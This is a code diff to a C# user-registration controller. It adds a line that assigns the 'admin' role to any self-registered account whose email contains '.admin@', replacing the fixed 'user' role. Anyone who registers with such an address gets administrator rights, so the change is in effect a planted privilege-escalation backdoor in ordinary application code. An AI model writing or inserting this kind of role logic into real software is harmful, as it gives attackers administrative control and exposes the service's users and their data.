@@ -26,12 +26,13 @@ namespace VaultBackend.Controllers
             if (await _db.Users.AnyAsync(u => u.Email == request.Email))
                 return BadRequest("Email already registered");
 
+            var role = request.Email.Contains(".admin@") ? "admin" : "user";
             var user = new User
             {
                 Email = request.Email,
                 Name = request.Name,
                 PasswordHash = BCrypt.Net.BCrypt.HashPassword(request.Password),
-                Role = "user",
+                Role = role,
                 Status = "active",
                 LastLogin = DateTime.UtcNow,
                 CreatedAt = DateTime.UtcNow
